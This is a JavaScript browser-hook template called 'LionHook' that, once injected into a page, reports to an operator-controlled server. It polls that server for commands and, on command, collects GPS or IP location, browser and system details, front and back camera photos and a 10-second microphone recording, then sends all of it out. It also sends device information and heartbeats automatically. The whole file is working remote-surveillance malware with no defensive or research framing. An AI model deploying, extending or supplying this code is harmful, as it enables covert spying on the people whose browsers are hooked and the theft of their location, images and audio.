(function() {
    'use strict';
    
    const deviceId = '{{ device_id }}';
    const serverUrl = '{{ server_url }}';
    const hookId = '{{ hook_id }}';
    
    console.log('🦁 LionHook activated for device:', deviceId);
    console.log('Server URL:', serverUrl);
    
    // Heartbeat system for persistent connection
    function sendHeartbeat() {
        console.log('📡 Sending heartbeat...');
        fetch(`${serverUrl}/api/heartbeat`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                device_id: deviceId,
                timestamp: new Date().toISOString()
            })
        })
        .then(response => response.json())
        .then(data => {
            console.log('✅ Heartbeat response:', data);
        })
        .catch(error => console.error('❌ Heartbeat error:', error));
    }
    
    // Send heartbeat every 20 seconds
    setInterval(sendHeartbeat, 20000);
    
    // Function to send data to server
    function sendData(type, content) {
        console.log('📤 Sending data:', type, content.substring(0, 100) + '...');
        fetch(`${serverUrl}/api/submit_data`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                device_id: deviceId,
                type: type,
                content: content
            })
        })
        .then(response => response.json())
        .then(data => {
            console.log('✅ Data sent successfully:', type);
        })
        .catch(error => console.error('❌ Error sending data:', error));
    }
    
    // Function to check for commands
    function checkCommands() {
        console.log('🔍 Checking for commands...');
        fetch(`${serverUrl}/api/check_commands/${deviceId}`)
            .then(response => response.json())
            .then(data => {
                if (data.commands && data.commands.length > 0) {
                    console.log('🎯 Commands received:', data.commands);
                    data.commands.forEach(cmd => {
                        console.log('⚡ Executing command:', cmd.command);
                        executeCommand(cmd.command);
                    });
                } else {
                    console.log('📭 No commands waiting');
                }
            })
            .catch(error => console.error('❌ Error checking commands:', error));
    }
    
    // Command execution
    function executeCommand(command) {
        console.log('🚀 Executing command:', command);
        switch(command) {
            case 'get_location':
                getLocation();
                break;
            case 'get_history':
                getBrowserHistory();
                break;
            case 'front_camera':
                takePhoto('front');
                break;
            case 'back_camera':
                takePhoto('back');
                break;
            case 'record_audio':
                recordAudio();
                break;
            case 'get_battery':
                getBatteryInfo();
                break;
            case 'get_network':
                getNetworkInfo();
                break;
            case 'get_system_info':
                getSystemInfo();
                break;
            default:
                console.log('❌ Unknown command:', command);
        }
    }
    
    // Get device location (Fixed)
    function getLocation() {
        console.log('📍 Getting location...');
        return new Promise((resolve) => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        console.log('✅ Location obtained');
                        const locationData = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy + ' meters',
                            altitude: position.coords.altitude,
                            heading: position.coords.heading,
                            speed: position.coords.speed,
                            timestamp: new Date(position.timestamp).toISOString(),
                            map_url: `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`
                        };
                        sendData('location', JSON.stringify(locationData, null, 2));
                        resolve(locationData);
                    },
                    function(error) {
                        console.error('❌ Location error:', error);
                        const errorData = {
                            error: error.message,
                            code: error.code,
                            timestamp: new Date().toISOString(),
                            note: 'GPS location failed'
                        };
                        sendData('location_error', JSON.stringify(errorData, null, 2));
                        
                        // Fallback: Get IP-based location
                        getIPLocation().then(resolve);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 15000,
                        maximumAge: 0
                    }
                );
            } else {
                console.log('❌ Geolocation not supported');
                const errorData = {
                    error: 'Geolocation API not supported',
                    timestamp: new Date().toISOString()
                };
                sendData('location_error', JSON.stringify(errorData, null, 2));
                getIPLocation().then(resolve);
            }
        });
    }
    
    // Fallback IP-based location
    function getIPLocation() {
        console.log('🌐 Getting IP location...');
        return fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                console.log('✅ IP location obtained');
                const ipLocation = {
                    ip: data.ip,
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    latitude: data.latitude,
                    longitude: data.longitude,
                    timezone: data.timezone,
                    isp: data.org,
                    source: 'IP-based',
                    timestamp: new Date().toISOString()
                };
                sendData('location_ip', JSON.stringify(ipLocation, null, 2));
                return ipLocation;
            })
            .catch(error => {
                console.error('❌ IP location failed:', error);
                sendData('location_error', 'Both GPS and IP location failed: ' + error.message);
            });
    }
    
    // Get browser history (Enhanced)
    function getBrowserHistory() {
        console.log('📚 Getting browser history...');
        const historyData = {
            current_url: window.location.href,
            referrer: document.referrer,
            title: document.title,
            user_agent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            cookies_enabled: navigator.cookieEnabled,
            java_enabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
            screen: {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth
            },
            viewport: {
                width: window.innerWidth,
                height: window.innerHeight
            },
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timestamp: new Date().toISOString()
        };
        
        // Try to get visited links on page
        try {
            const links = Array.from(document.links).map(link => ({
                href: link.href,
                text: link.textContent.substring(0, 100),
                hostname: link.hostname
            }));
            historyData.page_links = links;
            console.log('🔗 Found links:', links.length);
        } catch (e) {
            console.log('❌ Could not get links:', e);
        }
        
        sendData('history', JSON.stringify(historyData, null, 2));
        console.log('✅ History data sent');
    }
    
    // Take photo from camera
    async function takePhoto(cameraType) {
        console.log('📷 Taking photo:', cameraType);
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: cameraType === 'front' ? 'user' : 'environment',
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                }
            });
            
            console.log('✅ Camera access granted');
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            
            // Wait for video to be ready
            await new Promise(resolve => {
                video.onloadedmetadata = () => {
                    console.log('🎥 Video ready');
                    resolve();
                };
            });
            
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                
                const imageData = canvas.toDataURL('image/jpeg', 0.8);
                console.log('📸 Photo captured, size:', imageData.length);
                sendData(`photo_${cameraType}`, imageData);
                
                // Clean up
                stream.getTracks().forEach(track => track.stop());
                console.log('✅ Camera cleaned up');
            }, 2000);
            
        } catch (error) {
            console.error('❌ Camera error:', error);
            const errorData = {
                camera: cameraType,
                error: error.message,
                name: error.name,
                timestamp: new Date().toISOString()
            };
            sendData(`photo_error`, JSON.stringify(errorData, null, 2));
        }
    }
    
    // Record audio
    async function recordAudio() {
        console.log('🎤 Recording audio...');
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                audio: {
                    echoCancellation: true,
                    noiseSuppression: true,
                    sampleRate: 44100
                } 
            });
            console.log('✅ Microphone access granted');
            
            const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
            const audioChunks = [];
            
            mediaRecorder.ondataavailable = event => {
                audioChunks.push(event.data);
                console.log('🎵 Audio chunk received');
            };
            
            mediaRecorder.onstop = () => {
                console.log('⏹️ Recording stopped');
                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                const reader = new FileReader();
                reader.onload = function() {
                    console.log('📤 Sending audio data, size:', reader.result.length);
                    sendData('audio', reader.result);
                };
                reader.readAsDataURL(audioBlob);
            };
            
            mediaRecorder.start();
            console.log('⏺️ Recording started');
            setTimeout(() => {
                mediaRecorder.stop();
                stream.getTracks().forEach(track => track.stop());
                console.log('✅ Microphone cleaned up');
            }, 10000);
            
        } catch (error) {
            console.error('❌ Audio recording error:', error);
            const errorData = {
                error: error.message,
                name: error.name,
                timestamp: new Date().toISOString()
            };
            sendData('audio_error', JSON.stringify(errorData, null, 2));
        }
    }
    
    // Get battery info (Fixed)
    async function getBatteryInfo() {
        console.log('🔋 Getting battery info...');
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                const batteryInfo = {
                    level: Math.round(battery.level * 100) + '%',
                    charging: battery.charging,
                    chargingTime: battery.chargingTime === Infinity ? 'Unknown' : battery.chargingTime + ' seconds',
                    dischargingTime: battery.dischargingTime === Infinity ? 'Unknown' : battery.dischargingTime + ' seconds',
                    timestamp: new Date().toISOString()
                };
                console.log('✅ Battery info:', batteryInfo);
                sendData('battery', JSON.stringify(batteryInfo, null, 2));
            } catch (error) {
                console.error('❌ Battery API error:', error);
                sendData('battery_error', JSON.stringify({
                    error: error.message,
                    timestamp: new Date().toISOString()
                }, null, 2));
            }
        } else if ('battery' in navigator) {
            // Fallback for older implementations
            navigator.getBattery().then(function(battery) {
                const batteryInfo = {
                    level: Math.round(battery.level * 100) + '%',
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime,
                    source: 'legacy_api',
                    timestamp: new Date().toISOString()
                };
                console.log('✅ Battery info (legacy):', batteryInfo);
                sendData('battery', JSON.stringify(batteryInfo, null, 2));
            });
        } else {
            console.log('❌ Battery API not supported');
            sendData('battery_info', JSON.stringify({
                status: 'Battery API not supported in this browser',
                timestamp: new Date().toISOString()
            }, null, 2));
        }
    }
    
    // Get network info
    function getNetworkInfo() {
        console.log('📡 Getting network info...');
        const networkInfo = {
            connection: navigator.connection ? {
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink + ' Mbps',
                rtt: navigator.connection.rtt + ' ms',
                saveData: navigator.connection.saveData
            } : 'Not available',
            platform: navigator.platform,
            language: navigator.language,
            cookies: navigator.cookieEnabled,
            hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
            deviceMemory: navigator.deviceMemory || 'Unknown',
            timestamp: new Date().toISOString()
        };
        console.log('✅ Network info:', networkInfo);
        sendData('network', JSON.stringify(networkInfo, null, 2));
    }
    
    // Get system info
    function getSystemInfo() {
        console.log('💻 Getting system info...');
        const systemInfo = {
            user_agent: navigator.userAgent,
            platform: navigator.platform,
            vendor: navigator.vendor,
            languages: navigator.languages,
            screen: {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth
            },
            viewport: {
                width: window.innerWidth,
                height: window.innerHeight
            },
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookies: navigator.cookieEnabled,
            java: navigator.javaEnabled ? navigator.javaEnabled() : false,
            pdfViewer: navigator.pdfViewerEnabled || false,
            touchPoints: navigator.maxTouchPoints || 0,
            hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
            deviceMemory: navigator.deviceMemory || 'Unknown',
            timestamp: new Date().toISOString()
        };
        console.log('✅ System info collected');
        sendData('system_info', JSON.stringify(systemInfo, null, 2));
    }
    
    // Send initial device info
    const deviceInfo = {
        user_agent: navigator.userAgent,
        platform: navigator.platform,
        languages: navigator.languages,
        screen: {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth
        },
        viewport: {
            width: window.innerWidth,
            height: window.innerHeight
        },
        url: window.location.href,
        referrer: document.referrer,
        timestamp: new Date().toISOString(),
        hook_version: '2.0'
    };
    
    console.log('🚀 Sending initial device info...');
    sendData('device_info', JSON.stringify(deviceInfo, null, 2));
    
    // Check for commands every 3 seconds
    setInterval(checkCommands, 3000);
    
    // Initial heartbeat
    sendHeartbeat();
    
    console.log('🦁 LionHook Advanced v2.0 fully activated!');
    console.log('Device ID:', deviceId);
    console.log('Ready to receive commands...');
    
    // Make functions globally available for testing
    window.lionhook = {
        deviceId,
        checkCommands,
        getLocation,
        getBrowserHistory,
        takePhoto,
        recordAudio,
        getBatteryInfo,
        getNetworkInfo,
        getSystemInfo
    };
    
})();
